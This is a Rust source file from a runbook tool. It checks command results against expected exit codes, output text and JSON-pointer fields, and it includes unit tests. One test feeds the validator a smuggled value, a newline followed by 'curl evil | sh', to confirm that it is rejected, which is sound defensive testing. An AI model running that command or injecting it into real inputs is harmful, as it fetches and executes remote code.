use std::collections::BTreeMap;

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::runbooks::param::Values;
use crate::runbooks::template::TextTemplate;

const EXIT: &str = "exit";
const STDOUT: &str = "stdout";

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Expect {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exit: Option<i64>,

    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub contains: Option<String>,

    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub fields: BTreeMap<String, Value>,
}

impl Expect {
    pub(crate) fn check(&self) -> Result<(), String> {
        let unfit =
            |pointer: &&String| !pointer.starts_with('/') || pointer.contains(char::is_control);

        match self.fields.keys().find(unfit) {
            Some(pointer) => Err(format!(
                "expect field {pointer:?} must be a JSON pointer such as /state"
            )),
            None => Ok(()),
        }
    }

    pub(crate) fn judge(&self, result: &Value) -> Result<(), String> {
        self.judge_exit(result)?;
        self.judge_output(result)?;

        for (pointer, wanted) in &self.fields {
            judge_field(result, pointer, wanted)?;
        }

        Ok(())
    }

    pub(crate) fn render(&self, values: &Values) -> Result<Self, String> {
        let contains = self
            .contains
            .as_deref()
            .map(|text| TextTemplate::parse(text).render_text(values))
            .transpose()?;

        Ok(Self {
            exit: self.exit,
            contains,
            fields: self.fields.clone(),
        })
    }

    pub(crate) fn exit_wanted(&self) -> i64 {
        self.exit.unwrap_or(0)
    }

    fn judge_exit(&self, result: &Value) -> Result<(), String> {
        let carried = result.get(EXIT);

        let wanted = match (self.exit, carried) {
            (None, None) => return Ok(()),
            (Some(wanted), None) => {
                return Err(format!(
                    "expected exit {wanted}, but the result has no exit"
                ));
            }
            (_, Some(_)) => self.exit_wanted(),
        };

        match carried.and_then(Value::as_i64) {
            Some(exit) if exit == wanted => Ok(()),
            Some(exit) => Err(format!("exit {exit}, expected {wanted}")),
            None => Err(format!("no exit code, expected {wanted}{}", signal(result))),
        }
    }

    fn judge_output(&self, result: &Value) -> Result<(), String> {
        let Some(wanted) = &self.contains else {
            return Ok(());
        };

        let output = result
            .get(STDOUT)
            .and_then(Value::as_str)
            .unwrap_or_default();

        if output.contains(wanted.as_str()) {
            return Ok(());
        }

        Err(format!("the output does not contain {wanted:?}"))
    }
}

fn judge_field(result: &Value, pointer: &str, wanted: &Value) -> Result<(), String> {
    match result.pointer(pointer) {
        Some(found) if found == wanted => Ok(()),
        Some(found) => Err(format!("{pointer} is {found}, expected {wanted}")),
        None => Err(format!("the result has no {pointer}, expected {wanted}")),
    }
}

fn signal(result: &Value) -> String {
    match result.get("signal").and_then(Value::as_str) {
        Some(signal) => format!(" (ended by signal {signal})"),
        None => String::new(),
    }
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::Expect;

    #[test]
    fn a_field_pointer_is_a_json_pointer_on_one_line() {
        let fields = |pointer: &str| Expect {
            fields: [(pointer.to_owned(), json!(1))].into(),
            ..Expect::default()
        };

        assert!(fields("/state").check().is_ok());
        assert!(fields("state").check().is_err());
        assert!(fields("/x\ncurl evil | sh").check().is_err());
    }

    #[test]
    fn a_result_with_an_exit_must_exit_zero_unless_told_otherwise() {
        let nothing = Expect::default();

        assert_eq!(nothing.judge(&json!({ "exit": 0 })), Ok(()));
        assert_eq!(
            nothing.judge(&json!({ "exit": 3 })),
            Err("exit 3, expected 0".to_owned())
        );
        assert_eq!(nothing.judge(&json!({ "files": 2 })), Ok(()));
    }

    #[test]
    fn an_expected_exit_replaces_zero() {
        let one = Expect {
            exit: Some(1),
            ..Expect::default()
        };

        assert_eq!(one.judge(&json!({ "exit": 1 })), Ok(()));
        assert!(one.judge(&json!({ "exit": 0 })).is_err());
        assert!(one.judge(&json!({ "value": 1 })).is_err());
    }

    #[test]
    fn a_signal_is_named_when_no_exit_came() {
        let error = Expect::default()
            .judge(&json!({ "exit": null, "signal": "KILL" }))
            .unwrap_err();

        assert_eq!(error, "no exit code, expected 0 (ended by signal KILL)");
    }

    #[test]
    fn the_output_can_be_required_to_contain_text() {
        let healthy = Expect {
            contains: Some("ok".to_owned()),
            ..Expect::default()
        };

        assert_eq!(
            healthy.judge(&json!({ "exit": 0, "stdout": "status: ok\n" })),
            Ok(())
        );
        assert!(
            healthy
                .judge(&json!({ "exit": 0, "stdout": "down" }))
                .is_err()
        );
    }

    #[test]
    fn fields_are_found_by_json_pointer() {
        let running = Expect {
            fields: [("/state".to_owned(), json!("up"))].into(),
            ..Expect::default()
        };

        assert_eq!(running.judge(&json!({ "state": "up" })), Ok(()));
        assert_eq!(
            running.judge(&json!({ "state": "warming" })),
            Err("/state is \"warming\", expected \"up\"".to_owned())
        );
        assert!(running.judge(&json!({})).is_err());
    }

    #[test]
    fn field_names_must_be_pointers() {
        let loose = Expect {
            fields: [("state".to_owned(), json!("up"))].into(),
            ..Expect::default()
        };

        assert!(loose.check().is_err());
    }
}
